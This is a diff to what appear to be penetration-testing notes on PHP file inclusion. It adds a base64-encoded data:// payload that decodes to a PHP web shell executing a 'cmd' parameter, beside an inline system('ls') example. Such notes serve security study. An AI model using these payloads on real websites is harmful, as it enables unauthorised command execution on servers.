@@ -22,3 +22,4 @@ example reading admin.php
 we can use data:// to execute
 example:
 `/page=data://text/plain,<?php%20echo%20system('ls');?>` will execute ls
+`/page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls` this will execute ls with base64 encoding
